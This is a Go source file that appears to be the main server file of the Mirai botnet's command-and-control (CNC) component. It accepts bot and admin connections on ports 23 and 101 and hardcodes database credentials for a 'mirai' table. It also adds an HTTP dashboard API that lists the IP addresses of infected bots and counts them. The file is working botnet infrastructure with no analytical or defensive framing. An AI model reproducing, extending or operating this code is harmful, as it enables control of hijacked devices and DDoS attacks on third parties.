package main

import (
    "encoding/json"
    "fmt"
    "net"
    "net/http"
    "errors"
    "time"
)

const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "root"
const DatabasePass string   = "password"
const DatabaseTable string  = "mirai"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    tel, err := net.Listen("tcp", "0.0.0.0:23")
    if err != nil {
        fmt.Println(err)
        return
    }

    api, err := net.Listen("tcp", "0.0.0.0:101")
    if err != nil {
        fmt.Println(err)
        return
    }

    // HTTP API server — exposes /bots as JSON for the dashboard
    go func() {
        mux := http.NewServeMux()
        mux.HandleFunc("/bots", func(w http.ResponseWriter, r *http.Request) {
            ips := clientList.GetIPs()
            w.Header().Set("Content-Type", "application/json")
            if err := json.NewEncoder(w).Encode(ips); err != nil {
                http.Error(w, "encode error", http.StatusInternalServerError)
            }
        })
        mux.HandleFunc("/count", func(w http.ResponseWriter, r *http.Request) {
            w.Header().Set("Content-Type", "application/json")
            fmt.Fprintf(w, `{"count":%d}`, clientList.Count())
        })
        fmt.Println("[HTTP] Bot API listening on :9090")
        if err := http.ListenAndServe(":9090", mux); err != nil {
            fmt.Println("[HTTP] Error:", err)
        }
    }()

    go func() {
        for {
            conn, err := api.Accept()
            if err != nil {
                break
            }
            go apiHandler(conn)
        }
    }()

    for {
        conn, err := tel.Accept()
        if err != nil {
            break
        }
        go initialHandler(conn)
    }

    fmt.Println("Stopped accepting clients")
}

func initialHandler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(10 * time.Second))

    buf := make([]byte, 32)
    l, err := conn.Read(buf)
    if err != nil || l <= 0 {
        return
    }

    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
        if buf[3] > 0 {
            string_len := make([]byte, 1)
            l, err := conn.Read(string_len)
            if err != nil || l <= 0 {
                return
            }
            var source string
            if string_len[0] > 0 {
                source_buf := make([]byte, string_len[0])
                l, err := conn.Read(source_buf)
                if err != nil || l <= 0 {
                    return
                }
                source = string(source_buf)
            }
            NewBot(conn, buf[3], source).Handle()
        } else {
            NewBot(conn, buf[3], "").Handle()
        }
    } else {
        NewAdmin(conn).Handle()
    }
}

func apiHandler(conn net.Conn) {
    defer conn.Close()

    NewApi(conn).Handle()
}

func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0

    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }

    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
